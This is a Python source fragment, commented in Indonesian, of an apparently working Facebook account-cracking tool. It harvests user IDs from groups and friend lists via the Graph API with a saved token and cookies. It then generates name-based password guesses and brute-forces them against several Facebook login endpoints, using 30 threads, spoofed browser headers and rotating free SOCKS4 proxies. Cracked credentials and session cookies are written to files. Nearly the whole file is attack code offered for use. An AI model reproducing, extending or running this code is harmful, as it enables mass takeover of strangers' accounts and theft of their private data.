    ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
    miskinlu = {"user-agent": ua}
    url = "https://mbasic.facebook.com/groups/"+id
    ses = requests.Session()
    try:
        gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
    except requests.exceptions.ConnectionError:
        print('>> Sinyal Loo Kek Kontol ')
        time.sleep(0.5)
        exit()
    berr = gn.find("title")
    berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
    if berr2=='Masuk Facebook':
        print(" Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
        time.sleep(0.5)
        grup()
    elif berr2=='Kesalahan':
        print('>> Grup Tidak Di Temukan ')
        time.sleep(0.5)
        grup()
    else:pass
    print(f'{x}>> Nama Grup : {b}%s'%(berr2))
    ggs = gn.find_all('table')
    ang = []
    for ff in ggs:
        anggo = ff.text
        bro = anggo.replace('Anggota','')
        try:
            mex = int(bro)
            jumlah = ang.append(mex)
        except:
            pass
    if len(ang)==0:
        print(" Anggota : -")
    else:
        print(f'{x}>> Anggota : {h}%s'%(ang[0]))
    grup1(url)
def grup1(urls):
    use = []
    ses = requests.Session()
    print(f'{x}>> Sedang Mengumpulkan Idz ')
    print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
    while True:
        try:
            ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
            miskinlu = {"user-agent": ua}
            try:
                url = use[0]
            except:
                url = urls
            set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
            bf2 = set.find_all('a')
            for g in bf2:
                css = str(g).split('>')
                if 'Lihat Postingan Lainnya</span' in css:
                    bcj = str(g).replace('<a href="','').replace('amp;','')
                    bcj2 = bcj.split(' ')[0].replace('"><img','')
            tes = set.find_all('table')
            for cari in tes:
                liatnih = cari.text
                spl = liatnih.split(' ')
                if 'mengajukan' in spl:
                    idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
                    idyou =	idsiapa[0].replace('content_owner_id_new.','')
                    namayou = liatnih.replace(' mengajukan pertanyaan .','')
                    idku = idyou+'|'+namayou
                    if idku in id:
                        continue
                    else:
                        id.append(idku)
                        print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
                elif '>' in spl:
                    idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
                    idyou =	idsiapa[0].replace('content_owner_id_new.','')
                    namayou = liatnih.split(' > ')[0]
                    idku = idyou+'|'+namayou
                    if idku in id:
                        continue
                    else:
                        id.append(idku)
                        xy = random.choice([m,k,h,u,b,x])
                        print(f'\r	———>> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
                else:
                    continue
            try:
                link_ = bcj2
                use.insert(0,'https://mbasic.facebook.com'+link_)
            except:
                girang = set.find('title')
                girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
                if girang2=='Masuk Facebook':
                    pass
                else:
                    lah()
        except requests.exceptions.ConnectionError:
            try:
                time.sleep(31)
            except KeyboardInterrupt:
                lah()
        except KeyboardInterrupt:
            lah()
#------------------[ DUMP-ID ]-----------------#
def publikv2():
    with requests.Session() as ses:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        filetex = console.input(f" {H2}• {P2}Nama File Dump  :{U2} ")
        rspd  = ('/sdcard/RUDAL-DUMP/' + filetex + '.txt').replace(' ', '_')
        koli = open(rspd, 'w')
        try:
            params = {
            "access_token": token, 
            "fields": "name,friends.fields(id,name,birthday)"
            }
            b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
            for c in b["friends"]["data"]:
                id.append(c["id"]+"|"+c["name"])
                koli.write(c['id']+'|'+c['name']+ '\n')
                console.print(f'\r {H2}• {P2}Mengumpulkan {H2} %s {P2} Id'%(len(id)),end='\r')
                time.sleep(0.0050)
            console.print(f' {H2}• {P2}Total Id Dump :{H2} %s {P2} '%(len(id)))
            console.print(f' {H2}• {P2}File Disimpan Di {H2}%s{P2}'%(rspd))
            time.sleep(3)
            exit('\n{H2}Thank Sudah Mengunakan Script Ini{P2}\n')
        except Exception as e:
            print(e)

#-------------------[ CRACK-Masal ]----------------#
def massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        Console().print(Panel('\t[bold white] Mau Berapa Target Yang Mau Di Crack',width=80,style=f"{color_panel}", title="[bold green] Crack Masal [bold white]"))
        jum = int(input(f"{O}  ─> "))
    except ValueError:
        Console().print(f" {H2}• {P2} Wrong input ")
        exit()
    if jum<1 or jum>80:
        Console().print(f" {H2}• {P2} Pertemanan Tidak Publik  ")
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        Console().print(panel('\t[bold white] Masukkan Target ke '+str(yz)+'',width=80,style=f"{color_panel}"))
        kl = Console().input(f" {H2}• {P2}Masukan : ")
        uid.append(kl)
    for userr in uid:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                        }	          
                    )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                        }	           
                    )
            col = ses.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}Unstable Signal ")
            exit()
    try:
        Console().print(panel("""[bold white] Total Id Target Yang Terkumpul""",width=80,style=f"{color_panel}"))
        Console().print(f' {H2}• {P2}'+str(len(id)))					  
        setting()
    except requests.exceptions.ConnectionError:
        print(f'')
        print(' [+] Unstable Signal ')
        exit()
    except (KeyError,IOError):
        print(f' [+] Pertemanan Tidak Public ')
        time.sleep(3)
        exit()
  
def convert(cookie):
    cok = ('fr=%s;datr=%s;c_user=%s;xs=%s'%(cookie['fr'],cookie['datr'],cookie['c_user'],cookie['xs']))
    return(str(cok))


def cektahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = '2009'
        elif fx[:9] in ['100000000']       :tahunz = '2009'
        elif fx[:8] in ['10000000']        :tahunz = '2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
        elif fx[:6] in ['100001']          :tahunz = '2010'
        elif fx[:6] in ['100002','100003'] :tahunz = '2011'
        elif fx[:6] in ['100004']          :tahunz = '2012'
        elif fx[:6] in ['100005','100006'] :tahunz = '2013'
        elif fx[:6] in ['100007','100008'] :tahunz = '2014'
        elif fx[:6] in ['100009']          :tahunz = '2015'
        elif fx[:5] in ['10001']           :tahunz = '2016'
        elif fx[:5] in ['10002']           :tahunz = '2017'
        elif fx[:5] in ['10003']           :tahunz = '2018'
        elif fx[:5] in ['10004']           :tahunz = '2019'
        elif fx[:5] in ['10005']           :tahunz = '2020'
        elif fx[:5] in ['10006']           :tahunz = '2021'
        elif fx[:5] in ['10009']           :tahunz = '2023'
        elif fx[:5] in ['10007','10008']:tahunz = '2022'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = '2008'
    elif len(fx)==8:
        tahunz = '2007'
    elif len(fx)==7:
        tahunz = '2006'
    else:tahunz=''
    return tahunz
 
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
    Console().print(Panel(f'{P2}[{color_text}01{P2}] Crack akun Old [/]\n{P2}[{color_text}02{P2}] Crack Akun New [/]\n{P2}[{color_text}03{P2}] Crack Akun Random [[bold green]Recommended[bold white]][/]', title='[bold green] %s '%(len(id)),width=60,style=f"{color_panel}"))
    hu = console.input(f" {H2}• {P2}Masukan : ")
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print(' [+] Pilih Yang Bener Sayang ')
        exit()
    Console().print(Panel(f'{P2}[{color_text}01{P2}] Login Site [bold green]async.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white] [/]',width=60,style=f"{color_panel}", title="[bold green] Method"))
    hc = console.input(f" {H2}• {P2}Masukan : ")
    if hc in ['1','01']:
        method.append('asyn')
    elif hc in ['2','02']:
        method.append('validate')
    elif hc in ['3','03']:
        method.append('reguler')
    else:
        method.append('reguler')
    Console().print(Panel(f'[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T',title=f"[bold green]Setting User-Agent",width=60,style=f"{color_panel}"))
    uatambah = console.input(f" {H2}• {P2}Masukan : ")
    if uatambah in ['y','Ya','ya','Y']:
        ualuh.append('ya')
        bzer = console.input(f" {H2}• {P2}Masukan UA : ")
        ualu.append(bzer)
    else:
        ualuh.append('tidak')
    passwrd()
    
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
    global prog,des
    bi = random.choice([u,k,kk,b,h,hh])
    print('')
    urut = []
    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    wa.print(Columns(urut))
    awal = datetime.now()
    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold green]Informasi",width=60,style=f"{color_panel}"))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ['pantek123','indonesia123','kontol123','domino123','anjing123','sayangku','maling123','sayang123','malang123','bismillah123']
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'2000')
                        pwv.append(frs+'2001')
                        pwv.append(frs+'2002')
                        pwv.append(frs+'2003')
                        pwv.append(frs+'2004')
                        pwv.append(frs+'2005')
                        pwv.append(frs+'2006')
                        pwv.append(frs+'2007')
                        pwv.append(frs+'2008')
                        pwv.append(frs+'2010')
                        pwv.append(frs+'2009')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                        pwv.append(frs+'1234567')
                        pwv.append(frs+'01')
                        pwv.append(frs+'02')
                        pwv.append(frs+'03')
                        pwv.append(frs+'04')
                        pwv.append(frs+'05')
                        pwv.append(frs+'06')
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'reguler' in method:
                    pool.submit(reguler,idf,pwv)
                elif 'asyn' in method:
                    pool.submit(asyn,idf,pwv,"m.facebook.com")
                elif 'validate' in method:
                    pool.submit(mobile,idf,pwv)
                else:
                    pool.submit(asyn,idf,pwv,"m.facebook.com")
        print('')
    Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=60,style=f"{color_panel}"))
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    Console().print(Panel(' [bold green]Lanjut Crack Kembali ?  Y/T  ',width=60,style=f"{color_panel}"))
    li = console.input(f" {H2}• {P2}pilih : ")
    if li in ['Y','y']:
        back()
    else:
        Console().print(f"[bold green]	\n[bold yellow]God Bye Kawan")
        time.sleep(1)
        exit()

#--------------------[ METODE VALIDATE ]-----------------#
def mobile(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(prem)
	#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
	ses = requests.Session()
	prog.update(des,description=f"{h}Validate{x} {loop}/{len(id)} OK-:[bold cyan]{ok}[/] CP-:[bold gold]{cp}[/]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=281257358716694&kid_directed_site=0&app_id=281257358716694&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D281257358716694%26cbt%3D1696321674146%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ca3c4178a6c94%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%26client_id%3D281257358716694%26display%3Dtouch%26domain%3Dwww.klook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.klook.com%252Fen-MY%252Faccount%252F%26locale%3Den_US%26logger_id%3Df64c19c8aa5b84%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28511642d1973c%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%2526frame%253Df2d6ce58cf48a5c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28511642d1973c%26domain%3Dwww.klook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.klook.com%252Ffd3a37858b2db8%26relation%3Dopener%26frame%3Df2d6ce58cf48a5c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=281257358716694&kid_directed_site=0&app_id=281257358716694&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D281257358716694%26cbt%3D1696321674146%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ca3c4178a6c94%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%26client_id%3D281257358716694%26display%3Dtouch%26domain%3Dwww.klook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.klook.com%252Fen-MY%252Faccount%252F%26locale%3Den_US%26logger_id%3Df64c19c8aa5b84%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28511642d1973c%2526domain%253Dwww.klook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.klook.com%25252Ffd3a37858b2db8%2526relation%253Dopener%2526frame%253Df2d6ce58cf48a5c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv11.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28511642d1973c%26domain%3Dwww.klook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.klook.com%252Ffd3a37858b2db8%26relation%3Dopener%26frame%3Df2d6ce58cf48a5c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[red]{idf}").add(f"[red]{pw}")
				tree.add(f"[red]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{ua}\n")
				tree.add(f"[green]{kuki}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE ASYNC ]-----------------#
def asyn(idf,pwv,url):
    global loop,ok,cp
    rr = random.randint
    rc = random.choice
    prog.update(des,description=f'\r[bold white]ASYNC [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
    prog.advance(des)
    ua = random.choice(prem)
    ua2 = random.choice(free)
    #ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
    ses = requests.Session()
    for pw in pwv:
        pw = pw.lower()
        try:
            if 'ya' in ualuh: ua = ualu[0]
            proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
            open('socksku.txt','w').write(proxs)
            nip = rc(proxs)
            proxs = {'http': 'socks4://'+nip}
            link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
            date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'true',
            'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            "__dyn": "",
            "__csr": "",
            "__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
            "__a": "",
            "__user": "0",
            "_fb_noscript": "true"}
            head = {"Host": url,
            "content-length": f"{len(str(date))}",
            "sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
            "sec-ch-ua-mobile": "?1",
            "user-agent": ua,
            "viewport-width": f"str(rr(400,989)",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            "sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
            "x-asbd-id": "129477",
            "x-requested-with": "mark.via.gp",
            "sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua-platform": '"Android"',
            "accept": "*/*",
            "origin": "https://"+url,
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "zh-CN;q=0.8,zh;q=0.9",
            "x-response-format": "JSONStream"}		
            po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
            if "checkpoint" in ses.cookies.get_dict().keys():
                cp+=1
                tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
                tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
                prints(tree)
                os.popen('play-audio c.mp3')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                ceker(idf,pwv)
                akun.append(idf+'|'+pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
                prints(tree)
                os.popen('play-audio o.mp3')
                open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                cek_apk(kuki)
                break
            else:continue
        except requests.exceptions.ConnectionError:time.sleep(31)
    loop+=1


def validate(idf,pwv):
    global loop,ok,cp
    rr = random.randint
    prog.update(des,description=f" {K2}•{H2} VALIDATE {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    ua=random.choice(prem)
    ses = requests.Session()
    for pw in pwv:
        pw = pw.lower()
        try:
            ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
